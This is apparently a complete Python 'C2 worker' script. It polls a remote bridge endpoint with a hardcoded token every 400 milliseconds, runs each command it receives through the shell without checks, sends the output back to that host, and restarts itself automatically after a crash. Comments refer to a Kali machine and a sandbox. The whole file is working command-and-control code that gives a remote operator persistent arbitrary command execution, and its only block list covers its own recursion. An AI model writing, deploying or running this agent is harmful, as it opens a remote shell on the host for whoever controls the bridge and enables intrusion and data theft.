#!/usr/bin/env python3
"""
C2 Worker v7 — Bulletproof command executor
- Shorter timeout (30s) to prevent deadlocks
- Blocks recursion (can't run kali_* scripts inside sandbox)
- Auto-restarts on crash
- Handles stuck "executing" commands from previous runs
"""

import requests
import subprocess
import time
import json
import os
import sys
import signal
from datetime import datetime

BRIDGE_URL = "https://elio-acd17217.base44.app/functions/c2Bridge"
TOKEN = "shadow-core-c2-bridge-2026"
POLL_INTERVAL = 0.4  # 400ms fast polling
CMD_TIMEOUT = 30     # 30 seconds max per command (was 120, too long)
WORKSPACE = os.getcwd()

# Commands that should NOT run inside sandbox (would cause recursion/deadlock)
BLOCKED_PATTERNS = [
    "kali_chat", "kali_c2", "c2_worker", "c2_listener",
    "c2_stream_shell", "nohup"
]

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    with open("c2_worker.log", "a") as f:
        f.write(line + "\n")

def api(method, data=None, params=None):
    url = f"{BRIDGE_URL}?token={TOKEN}"
    if params:
        for k, v in params.items():
            url += f"&{k}={v}"
    try:
        if method == "GET":
            resp = requests.get(url, timeout=10)
        elif method == "POST":
            resp = requests.post(url, json={**data, "token": TOKEN}, timeout=10) if data else requests.post(url, json={"token": TOKEN}, timeout=10)
        elif method == "PUT":
            resp = requests.put(url, json={**data, "token": TOKEN}, timeout=10) if data else requests.put(url, json={"token": TOKEN}, timeout=10)
        else:
            return None
        if resp.status_code == 200:
            return resp.json()
        return None
    except Exception as e:
        log(f"API error: {e}")
        return None

def is_blocked(command):
    """Check if command would cause recursion/deadlock"""
    cmd_lower = command.lower()
    for pattern in BLOCKED_PATTERNS:
        if pattern in cmd_lower:
            return True
    return False

def execute_command(command):
    """Execute with strict timeout — never hangs"""
    log(f"Executing: {command[:120]}")
    
    try:
        proc = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,  # No stdin — prevents hanging on input()
            text=True,
            cwd=WORKSPACE
        )
        
        try:
            output, _ = proc.communicate(timeout=CMD_TIMEOUT)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            output = f"[TIMEOUT: Command exceeded {CMD_TIMEOUT}s — killed]"
        
        if not output:
            output = "(no output)"
        elif len(output) > 8000:
            output = output[:8000] + "\n... [truncated]"
        
        log(f"Done ({len(output)} chars)")
        return output
        
    except Exception as e:
        err = f"Error: {e}"
        log(err)
        return err

def cleanup_stuck_commands():
    """Clear any 'executing' commands left from crashed workers"""
    # The bridge GET without id returns pending OR executing commands
    # We need to mark old executing commands as errors
    result = api("GET")
    if result and result.get("command") and not result.get("output"):
        cmd_id = result.get("id", "")
        if cmd_id:
            log(f"Cleaning stuck command: {cmd_id}")
            api("PUT", {"id": cmd_id, "output": "[ERROR: Previous worker crashed]", "status": "completed"})

def main():
    log("=" * 50)
    log("C2 Worker v7 — Bulletproof")
    log(f"Timeout: {CMD_TIMEOUT}s | Poll: {POLL_INTERVAL}s")
    log("=" * 50)
    
    # Cleanup any stuck commands from previous runs
    cleanup_stuck_commands()
    
    # Test connection
    result = api("GET")
    if result is None:
        log("FATAL: Cannot connect to bridge")
        sys.exit(1)
    log(f"Bridge OK. Waiting for commands...")
    
    consecutive_errors = 0
    
    while True:
        try:
            result = api("GET")
            
            if result and result.get("command") and not result.get("output"):
                cmd_id = result.get("id", "")
                command = result["command"]
                
                log(f"Received [{cmd_id}]: {command[:100]}")
                
                # Block recursive commands
                if is_blocked(command):
                    log(f"BLOCKED (recursion guard): {command[:50]}")
                    api("PUT", {
                        "id": cmd_id,
                        "output": f"[BLOCKED: This command cannot run inside the sandbox. Run it on your Kali machine instead.]",
                        "status": "completed"
                    })
                    continue
                
                # Execute
                output = execute_command(command)
                
                # Post output
                api("PUT", {
                    "id": cmd_id,
                    "output": output,
                    "status": "completed"
                })
                
                log("Output sent. Ready.")
                consecutive_errors = 0
            
            time.sleep(POLL_INTERVAL)
            
        except KeyboardInterrupt:
            log("Shutting down...")
            break
        except Exception as e:
            consecutive_errors += 1
            log(f"Error #{consecutive_errors}: {e}")
            if consecutive_errors > 10:
                log("Too many errors, restarting...")
                break
            time.sleep(2)

if __name__ == "__main__":
    # Auto-restart wrapper
    while True:
        try:
            main()
        except Exception as e:
            log(f"Worker crashed: {e}. Restarting in 3s...")
            time.sleep(3)
